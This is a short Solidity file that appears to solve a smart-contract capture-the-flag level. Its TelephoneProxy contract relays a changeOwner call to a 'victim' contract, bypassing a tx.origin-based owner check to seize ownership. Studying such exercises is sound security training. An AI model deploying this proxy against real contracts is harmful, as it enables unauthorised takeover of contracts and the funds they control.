// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneProxy {
    function changeOwner(address victim, address newOwner) public {
        ITelephone(victim).changeOwner(newOwner);
    }
}
